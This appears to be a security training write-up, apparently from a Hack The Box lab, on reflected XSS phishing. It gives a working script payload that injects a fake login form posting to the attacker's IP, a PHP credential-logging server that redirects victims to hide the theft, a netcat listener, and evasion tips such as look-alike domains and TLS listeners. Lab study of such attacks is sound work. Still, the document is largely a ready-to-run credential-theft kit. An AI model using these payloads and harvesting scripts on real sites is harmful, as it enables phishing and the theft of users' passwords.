# XSS Phishing via Login Form Injection

XSS phishing differs from defacement in its goal: rather than making a change visible to everyone, you silently deceive a specific victim into submitting credentials to your server by making a trusted page appear to require a login.

***

## Attack Construction Flow

The attack builds in stages, each solving a specific problem with the previous step:

**Stage 1: Inject the fake form**
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

**Stage 2: Remove the original UI element** so the victim cannot see the legitimate input field that would reveal something is wrong:
```javascript
document.getElementById('urlform').remove();
```

**Stage 3: Comment out remaining original HTML** to eliminate leftover rendered content that breaks the illusion:
```
...PAYLOAD... <!--
```

All three stages combined into the final URL payload:
```
/phishing/index.php?url="><script>document.write('..form html..');document.getElementById('urlform').remove();</script><!--
```

***

## Why Each Stage Matters

If you skip stage 2, the original URL input form stays visible alongside your fake login form. A suspicious user immediately sees that something is appended rather than replacing the page. If you skip stage 3, leftover HTML fragments from the original source render below your injected content and break the visual deception. The HTML comment at the end is a clean technique since anything after `<!--` is treated as a comment by the browser, neutralising remaining markup without needing to know its exact content.

***

## Credential Capture: netcat vs PHP Server

| Method | Captures creds | Handles HTTP properly | Redirects victim | Leaves trace |
|--------|---------------|----------------------|-----------------|-------------|
| `nc -lvnp 80` | Yes (in URL) | No | No, shows error | No file written |
| PHP dev server | Yes (written to file) | Yes | Yes, back to original page | `creds.txt` |

The netcat approach is fine for confirming the attack works during testing, but in a real scenario the victim receives a "site can't be reached" error after submitting, which immediately signals something went wrong. The PHP server solves this by logging the credentials and then transparently redirecting back to the original page:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Start it with:
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# write index.php here
sudo php -S 0.0.0.0:80
```

Credentials arrive as GET parameters in the HTTP request because the form uses no `method` attribute, defaulting to GET:
```
GET /?username=test&password=test&submit=Login HTTP/1.1
```

***

## Why This Works on Reflected XSS

Reflected XSS is well suited for phishing because the entire payload lives in the URL. You craft one URL, send it to the target via email, chat, or any other channel, and the victim's browser renders the fake login form when they open it. The URL points to a domain the victim recognises and trusts, which is the entire basis of the deception.

The credential theft happens server-side on your machine. The victim's browser makes a GET request to your IP with the credentials in plain text in the URL, which your PHP script captures to `creds.txt` before returning them to the legitimate site. From the victim's perspective they logged in and are now using the application normally, with no indication anything went wrong.

***

## Operational Notes

A few things that determine whether the attack succeeds cleanly:

- **Your IP must be reachable by the victim**: If you are on a private VPN like the HTB `tun0` interface, the victim machine must be on the same network. In real engagements, you would use a public VPS or redirect through a domain
- **HTTPS vs HTTP**: Modern browsers warn users when a form on an HTTPS page submits to an HTTP endpoint. A `Mixed Content` warning in the browser console or a blocked request can fail the attack. In a real scenario, a listener with a valid TLS certificate avoids this
- **Form action URL visibility**: The form's `action` attribute containing a raw IP is visible in the page source to anyone who inspects it. Obfuscating it or using a look-alike domain increases credibility
- **Logging append mode**: The PHP script uses `"a+"` mode, so credentials from multiple victims accumulate in `creds.txt` rather than overwriting previous entries
